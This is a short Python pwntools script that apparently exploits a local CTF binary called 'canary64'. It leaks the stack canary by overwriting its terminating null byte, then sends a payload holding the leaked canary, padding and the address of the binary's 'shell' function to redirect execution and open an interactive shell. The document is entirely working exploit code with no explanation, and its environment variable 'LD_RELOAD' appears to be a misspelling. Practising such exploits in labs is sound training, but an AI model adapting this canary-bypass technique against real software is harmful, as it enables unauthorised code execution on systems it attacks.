from pwn import *
context(log_level='debug',os ='linux',arch='amd64')
p = process(['./canary64'],env={"LD_RELOAD":"./libc.so.6"})
elf = ELF('./canary64')
shelladdr = elf.symbols['shell']
p.sendline('a')
p.recvuntil('a\n')
canary = u64(p.recv(7).rjust(8,'\x00'))

payload = 'a'+p64(canary)+'12345678'+p64(shelladdr)

p.send(payload)

p.interactive()
